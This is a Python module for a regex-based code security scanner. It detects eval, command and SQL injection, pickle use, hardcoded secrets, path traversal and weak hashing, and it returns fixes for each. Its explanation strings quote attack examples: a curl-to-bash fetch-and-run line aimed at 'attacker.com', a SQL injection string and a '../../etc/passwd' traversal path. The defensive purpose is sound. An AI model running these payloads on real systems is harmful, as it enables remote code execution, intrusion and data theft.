import re
from typing import List, Tuple

try:
    from .models import AnalysisResponse
except ImportError:
    from models import AnalysisResponse


def analyze_security(code: str, language: str = "python", context_type: str = "snippet") -> AnalysisResponse:
    """
    Analyzes code snippets or stack traces for security vulnerabilities,
    risky functions, and unsafe practices using specialized heuristics
    and defensive code transformation patterns.
    """
    code_clean = code.strip()
    lines = code.splitlines()

    if not code_clean:
        return AnalysisResponse(
            is_vulnerable=False,
            threat_description="Empty input provided. No code to analyze.",
            severity_score=1,
            suggested_fix_code="# No code provided. Paste code snippet to analyze.",
            explanation="Input was blank. Please submit a valid source code snippet or stack trace.",
            vulnerability_type="None",
            cwe_id="N/A",
            risk_level="Secure",
            remediation_steps=["Submit code snippet or error trace to begin auditing."],
            line_highlights=[]
        )

    # 1. Check if input is a Stack Trace
    if "Traceback (most recent call last):" in code or "File \"" in code and ("line " in code or "Error:" in code):
        return _analyze_stack_trace(code, lines)

    # 2. Sequential Security Vulnerability Scanners (Ordered by severity / specificity)

    # A. Remote Code Execution via eval() / exec()
    eval_match, eval_lines = _check_eval_exec(lines)
    if eval_match:
        return _build_eval_response(code, eval_lines)

    # B. Command Injection via os.system / subprocess shell=True
    cmd_match, cmd_lines = _check_command_injection(lines)
    if cmd_match:
        return _build_command_injection_response(code, cmd_lines)

    # C. SQL Injection via string formatting / concatenation
    sqli_match, sqli_lines = _check_sql_injection(lines)
    if sqli_match:
        return _build_sql_injection_response(code, sqli_lines)

    # D. Insecure Deserialization (pickle.loads, etc.)
    pickle_match, pickle_lines = _check_insecure_deserialization(lines)
    if pickle_match:
        return _build_insecure_deserialization_response(code, pickle_lines)

    # E. Hardcoded Secrets / API Keys / Passwords
    secret_match, secret_lines = _check_hardcoded_secrets(lines)
    if secret_match:
        return _build_hardcoded_secrets_response(code, secret_lines)

    # F. Path Traversal / Arbitrary File Read/Write
    path_match, path_lines = _check_path_traversal(lines)
    if path_match:
        return _build_path_traversal_response(code, path_lines)

    # G. Weak Cryptographic Hashing
    crypto_match, crypto_lines = _check_weak_crypto(lines)
    if crypto_match:
        return _build_weak_crypto_response(code, crypto_lines)

    # 3. Clean / Safe Code Fallback
    return _build_clean_code_response(code)


# ------------------ Detection Helpers ------------------

def _check_eval_exec(lines: List[str]) -> Tuple[bool, List[int]]:
    eval_pattern = re.compile(r'\b(eval|exec|compile)\s*\(', re.IGNORECASE)
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if eval_pattern.search(line) and not line.strip().startswith('#'):
            matched_lines.append(idx)
    return (len(matched_lines) > 0, matched_lines)


def _check_command_injection(lines: List[str]) -> Tuple[bool, List[int]]:
    patterns = [
        re.compile(r'os\.system\s*\(', re.IGNORECASE),
        re.compile(r'os\.popen\s*\(', re.IGNORECASE),
        re.compile(r'subprocess\.(Popen|run|call|check_output)\s*\(.*shell\s*=\s*True', re.IGNORECASE),
        re.compile(r'subprocess\.(Popen|run|call|check_output)\s*\(.*[\+\%]', re.IGNORECASE),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        for p in patterns:
            if p.search(line):
                matched_lines.append(idx)
                break
    return (len(matched_lines) > 0, matched_lines)


def _check_sql_injection(lines: List[str]) -> Tuple[bool, List[int]]:
    sql_keywords = re.compile(r'\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b', re.IGNORECASE)
    unsafe_formats = [
        re.compile(r'f["\'].*\{.*\}', re.IGNORECASE),
        re.compile(r'["\'].*%\s*\(.*\)'),
        re.compile(r'\.format\s*\('),
        re.compile(r'["\']\s*\+\s*[a-zA-Z_]'),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        if sql_keywords.search(line):
            for uf in unsafe_formats:
                if uf.search(line):
                    matched_lines.append(idx)
                    break
        elif re.search(r'(execute|cursor\.execute|db\.query)\s*\(.*(\+|\.format|f["\'])', line):
            matched_lines.append(idx)

    return (len(matched_lines) > 0, matched_lines)


def _check_insecure_deserialization(lines: List[str]) -> Tuple[bool, List[int]]:
    patterns = [
        re.compile(r'pickle\.(loads|load)\s*\('),
        re.compile(r'marshal\.(loads|load)\s*\('),
        re.compile(r'yaml\.load\s*\(.*Loader\s*=\s*(yaml\.)?Loader', re.IGNORECASE),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        for p in patterns:
            if p.search(line):
                matched_lines.append(idx)
                break
    return (len(matched_lines) > 0, matched_lines)


def _check_hardcoded_secrets(lines: List[str]) -> Tuple[bool, List[int]]:
    patterns = [
        re.compile(r'(api_key|apikey|secret_key|private_key|auth_token|password|aws_secret_access_key|token|access_key)\s*=\s*["\'][A-Za-z0-9_\-\.\=\+\/]{8,}["\']', re.IGNORECASE),
        re.compile(r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----'),
        re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
        re.compile(r'ghp_[0-9a-zA-Z]{36,}'),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        for p in patterns:
            if p.search(line):
                matched_lines.append(idx)
                break
    return (len(matched_lines) > 0, matched_lines)


def _check_path_traversal(lines: List[str]) -> Tuple[bool, List[int]]:
    patterns = [
        re.compile(r'open\s*\(\s*(user_input|filename|path|req\.|request\.)', re.IGNORECASE),
        re.compile(r'open\s*\(\s*os\.path\.join\(.*(user_input|filename|path|request)', re.IGNORECASE),
        re.compile(r'send_file\s*\(\s*(user_input|filename|path)', re.IGNORECASE),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        for p in patterns:
            if p.search(line):
                matched_lines.append(idx)
                break
    return (len(matched_lines) > 0, matched_lines)


def _check_weak_crypto(lines: List[str]) -> Tuple[bool, List[int]]:
    patterns = [
        re.compile(r'hashlib\.(md5|sha1)\s*\(', re.IGNORECASE),
        re.compile(r'Crypto\.Cipher\.(DES|ARC4)', re.IGNORECASE),
    ]
    matched_lines = []
    for idx, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            continue
        for p in patterns:
            if p.search(line):
                matched_lines.append(idx)
                break
    return (len(matched_lines) > 0, matched_lines)


# ------------------ Response Builders ------------------

def _build_eval_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import ast
import json

# Remediation: Replace unsafe eval/exec with safe parser or JSON decoding
def safe_evaluate(user_payload: str):
    try:
        # Use ast.literal_eval for primitive Python literals (strings, numbers, dicts, lists)
        return ast.literal_eval(user_payload)
    except (ValueError, SyntaxError):
        # Or parse strict JSON schema
        return json.loads(user_payload)
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Arbitrary Code Execution via dangerous dynamic evaluation (`eval()` / `exec()`).",
        severity_score=5,
        suggested_fix_code=suggested,
        explanation=(
            "The `eval()` and `exec()` functions dynamically parse and execute arbitrary Python expressions "
            "with the permissions of the running process. If supplied with unvalidated user input, an attacker can "
            "craft a payload (e.g. `__import__('os').system('curl attacker.com/exploit | bash')`) to achieve full "
            "Remote Code Execution (RCE), compromising the entire server and host environment."
        ),
        vulnerability_type="Remote Code Execution (RCE)",
        cwe_id="CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code",
        risk_level="Critical",
        remediation_steps=[
            "Remove all invocations of `eval()` and `exec()` immediately.",
            "Use `ast.literal_eval()` when only evaluating literal structures (strings, numbers, tuples, lists, dicts, booleans).",
            "Use standard structured serialization formats such as JSON (`json.loads()`) with strict schema validation.",
            "Enforce strict allowlists if dynamically dispatching function names."
        ],
        line_highlights=line_numbers
    )


def _build_command_injection_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import subprocess
import shlex

def execute_safe_command(user_arg: str):
    # Remediation: Pass arguments as a structured array without shell=True
    # Validate or sanitize arguments before execution
    sanitized_arg = shlex.quote(user_arg)
    
    result = subprocess.run(
        ["/usr/bin/ping", "-c", "1", sanitized_arg],
        capture_output=True,
        text=True,
        check=True,
        shell=False  # Crucial: shell=False prevents shell metacharacter injection
    )
    return result.stdout
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Operating System Command Injection via unsanitized system call execution.",
        severity_score=5,
        suggested_fix_code=suggested,
        explanation=(
            "Passing unvalidated user inputs directly into `os.system()` or `subprocess` calls with `shell=True` "
            "allows adversaries to append shell metacharacters (e.g. `;`, `&&`, `|`, `` ` ``) and execute arbitrary "
            "operating system commands. This enables full host takeover, data exfiltration, and lateral network movement."
        ),
        vulnerability_type="Command Injection",
        cwe_id="CWE-78: Improper Neutralization of Special Elements used in an OS Command",
        risk_level="Critical",
        remediation_steps=[
            "Avoid calling system shell commands whenever standard library modules (e.g., `os`, `shutil`, `pathlib`) can accomplish the task.",
            "Never use `shell=True` in `subprocess` invocations with external input.",
            "Pass executable paths and arguments as distinct list elements (`['cmd', 'arg1', 'arg2']`).",
            "Sanitize input strings using `shlex.quote()` and apply strict whitelist validation regexes."
        ],
        line_highlights=line_numbers
    )


def _build_sql_injection_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """# Remediation: Use Parameterized Queries / Prepared Statements
def query_user_safely(cursor, user_id: str, username: str):
    # Parameterized query with placeholder `%s` or `?` prevents SQL injection
    query = "SELECT id, username, email FROM users WHERE id = %s AND username = %s"
    
    # Values passed as a tuple parameter to the database driver
    cursor.execute(query, (user_id, username))
    return cursor.fetchall()
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="SQL Injection flaw due to dynamic query construction with unescaped string formatting.",
        severity_score=4,
        suggested_fix_code=suggested,
        explanation=(
            "Constructing SQL statements via string concatenation (`+`), f-strings, or `.format()` merges untrusted "
            "data with SQL command syntax. Attackers can inject SQL syntax payloads (e.g., `' OR '1'='1' --`) to bypass "
            "authentication, extract confidential database records, or drop tables."
        ),
        vulnerability_type="SQL Injection (SQLi)",
        cwe_id="CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
        risk_level="High",
        remediation_steps=[
            "Use parameterized SQL queries or prepared statements provided by your DB-API client (psycopg2, sqlite3, etc.).",
            "Use modern ORMs (such as SQLAlchemy, Tortoise-ORM, or Django ORM) with parameterized abstractions.",
            "Never concatenate raw user input strings directly into SQL query strings.",
            "Apply principle of least privilege to database user accounts."
        ],
        line_highlights=line_numbers
    )


def _build_insecure_deserialization_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import json
import hmac
import hashlib

# Remediation: Replace pickle with safe structured data serialization (JSON / MessagePack)
def safe_unpack(data_bytes: bytes) -> dict:
    # 1. Parse JSON safely without executing arbitrary bytecode
    decoded_str = data_bytes.decode('utf-8')
    payload = json.loads(decoded_str)
    return payload
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Insecure Object Deserialization via `pickle` / unverified bytecode unpacking.",
        severity_score=5,
        suggested_fix_code=suggested,
        explanation=(
            "The `pickle` module in Python is inherently unsafe for untrusted data. Objects can implement `__reduce__` "
            "to invoke arbitrary functions and system commands during unpickling. An adversary who controls pickled bytes "
            "can trigger instant remote code execution upon deserialization."
        ),
        vulnerability_type="Insecure Deserialization",
        cwe_id="CWE-502: Deserialization of Untrusted Data",
        risk_level="Critical",
        remediation_steps=[
            "Never deserialize untrusted data with `pickle`, `marshal`, or `shelve`.",
            "Adopt standard data interchange formats like JSON, YAML (with `yaml.safe_load`), or Protocol Buffers.",
            "If binary serialization is mandatory, sign payloads using HMAC cryptographic tokens with a secret key."
        ],
        line_highlights=line_numbers
    )


def _build_hardcoded_secrets_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import os
from pydantic_settings import BaseSettings

# Remediation: Load sensitive secrets from environment variables or secret vaults
class Settings(BaseSettings):
    api_key: str = os.getenv("APP_API_KEY", "")
    database_url: str = os.getenv("DATABASE_URL", "")

settings = Settings()

def get_authorized_client():
    if not settings.api_key:
        raise ValueError("API key must be configured in environment.")
    return {"Authorization": f"Bearer {settings.api_key}"}
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Hardcoded Sensitive Credentials / API Secrets detected in source code.",
        severity_score=4,
        suggested_fix_code=suggested,
        explanation=(
            "Storing private keys, API credentials, or passwords directly in source code risks credential exposure "
            "if repository history is leaked, committed publicly to version control, or inspected in client-side bundles. "
            "Compromised credentials permit unauthorized access to cloud services and critical APIs."
        ),
        vulnerability_type="Hardcoded Secrets",
        cwe_id="CWE-798: Use of Hard-coded Credentials",
        risk_level="High",
        remediation_steps=[
            "Remove all credentials from source code immediately and revoke exposed keys in production.",
            "Extract configuration into environment variables (`.env`) or secret management vaults (e.g. AWS Secrets Manager, Vault).",
            "Add `.env` and sensitive credential patterns to `.gitignore`.",
            "Implement automated pre-commit secret scanning hooks in CI/CD."
        ],
        line_highlights=line_numbers
    )


def _build_path_traversal_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import os
from pathlib import Path

BASE_SAFE_DIR = Path("/safe/upload/directory").resolve()

# Remediation: Canonicalize path and verify it remains within base directory boundary
def get_safe_file_path(user_filename: str) -> Path:
    # 1. Strip directory traversal tokens
    clean_name = os.path.basename(user_filename)
    target_path = (BASE_SAFE_DIR / clean_name).resolve()
    
    # 2. Prevent directory breakout
    if not target_path.is_relative_to(BASE_SAFE_DIR):
        raise PermissionError("Access denied: Path traversal attempt detected.")
        
    return target_path
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Path Traversal / Arbitrary File Access risk via unsanitized file path construction.",
        severity_score=4,
        suggested_fix_code=suggested,
        explanation=(
            "When user input is directly concatenated to filesystem paths without canonical validation, attackers "
            "can supply dot-dot-slash sequences (`../../etc/passwd`) to escape the target directory. This facilitates "
            "unauthorized reading or overwriting of sensitive system and configuration files."
        ),
        vulnerability_type="Path Traversal",
        cwe_id="CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        risk_level="High",
        remediation_steps=[
            "Resolve absolute paths using `Path.resolve()` and verify `target.is_relative_to(base_dir)`.",
            "Sanitize filenames using `os.path.basename()` or library helpers.",
            "Use an indirect lookup ID (e.g. UUIDs stored in a database) instead of client-supplied filenames."
        ],
        line_highlights=line_numbers
    )


def _build_weak_crypto_response(code: str, line_numbers: List[int]) -> AnalysisResponse:
    suggested = """import hashlib
import secrets

# Remediation: Use modern SHA-256 / Argon2 / bcrypt for cryptographic security
def hash_data_securely(data: str) -> str:
    # Use SHA-256 for non-password digests with high collision resistance
    return hashlib.sha256(data.encode('utf-8')).hexdigest()

# For password hashing, use dedicated slow hashing functions (e.g. bcrypt or argon2)
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description="Use of Cryptographically Broken or Weak Hashing Algorithm (e.g. MD5 / SHA-1).",
        severity_score=3,
        suggested_fix_code=suggested,
        explanation=(
            "MD5 and SHA-1 suffer from known practical collision vulnerabilities and pre-image attacks. They are "
            "insufficient for data integrity, digital signatures, and especially password storage, where fast hashing "
            "enables rapid brute-force dictionary attacks."
        ),
        vulnerability_type="Weak Cryptography",
        cwe_id="CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
        risk_level="Medium",
        remediation_steps=[
            "Migrate from MD5 / SHA-1 to SHA-256, SHA-384, or SHA-512 for cryptographic hashing.",
            "For password hashing and authentication, employ `argon2-cffi` or `bcrypt` with work-factor salts.",
            "Ensure unique cryptographic salts and nonces are generated with `secrets` module."
        ],
        line_highlights=line_numbers
    )


def _analyze_stack_trace(trace: str, lines: List[str]) -> AnalysisResponse:
    # Identify error type and pinpointed location
    error_match = re.search(r'([A-Za-z0-9_]+Error|Exception):\s*(.*)', trace)
    error_type = error_match.group(1) if error_match else "Runtime Exception"
    error_msg = error_match.group(2) if error_match else "Uncaught exception in execution flow."

    file_line_matches = re.findall(r'File "([^"]+)", line (\d+), in (.*)', trace)
    highlight_lines = [int(m[1]) for m in file_line_matches] if file_line_matches else [1]

    suggested = f"""# Remediation: Defensive Exception Handling & Input Guard
def safe_handler():
    try:
        # Guard against {error_type}
        # Validate inputs, null checks, and bounds
        pass
    except {error_type} as err:
        # Structured logging without leaking internal stack traces to clients
        import logging
        logging.getLogger(__name__).error(f"Handled error: {{err}}")
        return {{"error": "Operation could not be completed securely", "status": 400}}
"""
    return AnalysisResponse(
        is_vulnerable=True,
        threat_description=f"Stack Trace Root Cause: {error_type} - {error_msg[:120]}",
        severity_score=3,
        suggested_fix_code=suggested,
        explanation=(
            f"Analysis of the diagnostic stack trace identified an unhandled `{error_type}`. "
            "Exposing raw stack traces to end users leads to Information Disclosure (CWE-209), revealing internal "
            "directory layouts, library versions, and execution state that attackers utilize to craft targeted exploits."
        ),
        vulnerability_type="Information Exposure / Unhandled Exception",
        cwe_id="CWE-209: Generation of Error Message Containing Sensitive Information",
        risk_level="Medium",
        remediation_steps=[
            f"Add defensive try/except boundaries to intercept `{error_type}` safely.",
            "Sanitize error responses returned over public APIs (return generic HTTP 400/500 messages).",
            "Send complete diagnostic stack traces exclusively to private server logs and monitoring telemetry."
        ],
        line_highlights=highlight_lines
    )


def _build_clean_code_response(code: str) -> AnalysisResponse:
    return AnalysisResponse(
        is_vulnerable=False,
        threat_description="No immediate security vulnerabilities detected. Code demonstrates safe patterns.",
        severity_score=1,
        suggested_fix_code=code,
        explanation=(
            "Kestrel AI security analysis completed. No high-risk signatures (such as injection vectors, insecure "
            "eval/exec calls, hardcoded credentials, or insecure deserialization) were detected in the analyzed snippet. "
            "Continue adhering to standard secure coding principles and static analysis scanning."
        ),
        vulnerability_type="None (Clean)",
        cwe_id="N/A",
        risk_level="Secure",
        remediation_steps=[
            "Maintain automated security linting and dependency vulnerability scanning in CI/CD.",
            "Conduct peer code reviews for sensitive business logic and authentication paths.",
            "Ensure inputs continue to be validated against strict schemas."
        ],
        line_highlights=[]
    )
